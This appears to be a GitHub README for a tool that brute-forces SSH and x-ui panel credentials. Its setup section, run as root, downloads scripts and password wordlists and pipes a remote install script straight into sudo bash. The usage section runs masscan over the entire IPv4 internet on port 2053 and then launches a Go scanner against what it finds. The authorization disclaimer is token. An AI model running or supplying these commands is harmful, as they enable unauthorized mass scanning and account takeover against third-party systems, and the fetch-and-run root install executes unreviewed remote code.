# Auto-Brute-Force-Tool

A powerful automated tool for brute-forcing credentials and scanning for vulnerabilities. Designed for penetration testers and security researchers.

## Features

- Automated credential brute-forcing for SSH and other services
- Masscan integration for fast port scanning
- Easy setup with pre-configured scripts and dictionaries
- Flexible username/password sources

## Requirements

- Linux (Debian/Ubuntu recommended)
- Python 3
- Go
- `curl`, `screen`, `masscan`

## Installation

Clone the repository:

```sh
git clone https://github.com/hackthesystm13/Auto-Brute-Force-Tool.git
cd Auto-Brute-Force-Tool
```

**Run the setup commands:**  
_(Requires root privileges for installation and file downloads)_

```sh
if [ "$EUID" -ne 0 ]; then
  echo "Please run as root"
  exit
fi

sudo curl -o xui.py "https://raw.githubusercontent.com/CXK-Computer/Auto-Brute-Force-Tool/refs/heads/main/xui.py"
sudo curl -o password.txt "https://raw.githubusercontent.com/CXK-Computer/Auto-Brute-Force-Tool/refs/heads/main/password.txt"
sudo curl -o username.txt "https://raw.githubusercontent.com/CXK-Computer/Auto-Brute-Force-Tool/refs/heads/main/username.txt"
sudo curl -o 1.txt "https://raw.githubusercontent.com/CXK-Computer/Auto-Brute-Force-Tool/refs/heads/main/1.txt"
sudo curl -o nz.txt "https://raw.githubusercontent.com/CXK-Computer/Auto-Brute-Force-Tool/refs/heads/main/nz.txt"
sudo curl -o xd.txt "https://raw.githubusercontent.com/CXK-Computer/Auto-Brute-Force-Tool/refs/heads/main/xd.txt"
sudo curl -o xuiyg.txt "https://raw.githubusercontent.com/CXK-Computer/Auto-Brute-Force-Tool/refs/heads/main/xuiyg.txt"
sudo bash <(curl -Ls https://raw.githubusercontent.com/CXK-Computer/Auto-Brute-Force-Tool/main/install_tools.sh | tr -d '\r')
sudo curl -o username.txt "https://raw.githubusercontent.com/wwl012345/PasswordDic/refs/heads/main/%E7%94%A8%E6%88%B7%E5%90%8D%E5%AD%97%E5%85%B8/SSH-username-top30.txt"
sudo curl -o password.txt "https://raw.githubusercontent.com/wwl012345/PasswordDic/refs/heads/main/%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AD%97%E5%85%B8/2021passwd-CN-Top200.txt"
sudo curl -o scan_xui.go "https://raw.githubusercontent.com/CXK-Computer/Auto-Brute-Force-Tool/refs/heads/main/scan_xui.go"
sudo curl -o password.txt "https://raw.githubusercontent.com/CXK-Computer/Auto-Brute-Force-Tool/refs/heads/main/ssh_password.txt"
sudo curl -o username.txt "https://raw.githubusercontent.com/CXK-Computer/Auto-Brute-Force-Tool/refs/heads/main/ssh_username.txt"
sudo curl -o password.txt "https://raw.githubusercontent.com/r35tart/RW_Password/refs/heads/master/%E7%AC%A6%E5%90%88%E5%9B%9B%E4%B8%AA%E6%9D%A1%E4%BB%B6%E7%9A%848%E4%BD%8D%E6%95%B0%E5%AF%86%E7%A0%8114[...]"
sudo curl -o username.txt "https://raw.githubusercontent.com/CXK-Computer/Auto-Brute-Force-Tool/refs/heads/main/nz_username.txt"
sudo apt-get update && sudo apt-get install screen -y
```

## Usage

```sh
screen -v
screen -S aissist
python3 xui.py            # Run the brute force script
screen -r aissist         # Reattach to the running screen session
masscan --exclude 255.255.255.255 -p2053 --max-rate 100000 -oG results2053.txt 0.0.0.0/0
HOME=/root go run scan_xui.go
```

## Notes

- Ensure you have the necessary permissions and legal rights to perform brute-force or scanning activities.
- Use responsibly and only on systems you own or have explicit permission to test.

## License

This project is intended for educational and authorized testing purposes only.
